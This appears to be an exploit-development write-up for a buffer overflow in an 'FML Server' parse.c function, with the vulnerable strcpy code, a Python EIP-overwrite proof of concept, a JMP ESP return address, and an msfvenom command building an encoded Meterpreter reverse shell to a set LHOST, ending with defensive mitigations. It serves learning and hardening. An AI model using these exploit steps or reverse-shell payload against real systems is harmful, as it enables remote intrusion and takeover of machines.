FML Server Exploit Assessment

Remote Code Execution via Buffer Overflow

A comprehensive security assessment involving source code audit, stack memory corruption, and the development of a weaponized exploit to achieve a Meterpreter shell.

1. Vulnerability Discovery

During a source code audit of parse.c, I identified a classic buffer overflow in the isASCII() function. The root cause is a size mismatch between the calling function's 1000-byte rawCommand buffer and a locally defined 500-byte cmdToParse array.

// Source: parse.c
int isASCII(char* rawInput) {
    char cmdToParse[500]; // Insufficient buffer size
    // ...
    strcpy(cmdToParse, rawInput); // Vulnerable function: No bounds checking
    // ...
}

The use of strcpy() allows an attacker to write past the allocated 500 bytes, overwriting adjacent memory on the stack, including the EBP (Base Pointer) and EIP (Instruction Pointer).

2. Stack Mapping & Register Control

Using a custom Python fuzzer, I determined that an offset of exactly 502 bytes was required to reach the EBP, followed by 4 bytes to control the EIP. I verified this by overwriting the EIP with 0x42424242 ('BBBB').

# Proof of Concept: Redirecting EIP to 42424242
import socket
payload = b"A" * 502 + b"BBBB" + b"C" * 20
cmd = b"upload upload " + payload
# ... socket connection logic ...
Debugger State at Crash:
EBP: 41414141 ('AAAA')
EIP: 42424242 ('BBBB')
Result: Access violation when executing 0x42424242

3. Finding the Pivot (JMP ESP)

To execute code, I needed to redirect the EIP to a location I controlled. Using x32dbg, I searched for a JMP ESP instruction within the application's memory to "bounce" the execution flow back onto the stack where my shellcode would reside.

  • Instruction Found: FFE4 (JMP ESP)
  • Memory Address: 0x561586B3 (Note: Address must be provided in Little Endian format: \xb3\x86\x15\x56)

4. Weaponization & Bad Byte Evasion

Before generating the payload, I identified "Bad Bytes" (\x00 and \x0a) that would terminate the strcpy() prematurely. I used msfvenom with the shikata_ga_nai encoder to generate an encoded Meterpreter reverse shell.

# Generating the payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.204.39 LPORT=9999 \
-b "\x00\x0a" -f python -e x86/shikata_ga_nai

I prepended the shellcode with a 20-byte NOP Sled (\x90) to ensure successful execution even if the stack pointer shifted slightly.

Defensive Recommendations

To secure the FML Server against similar memory corruption attacks, the following mitigations are essential:

  • Safe Functions: Replace strcpy() with strncpy() to enforce buffer length limits.
  • Stack Canaries: Enable compiler-generated "cookies" that detect stack smashing before function return.
  • ASLR & DEP: Implement Address Space Layout Randomization and Data Execution Prevention to make memory addresses unpredictable and the stack non-executable.
  • Control Flow Guard (CFG): Use Microsoft's CFG to restrict indirect call/jump targets.
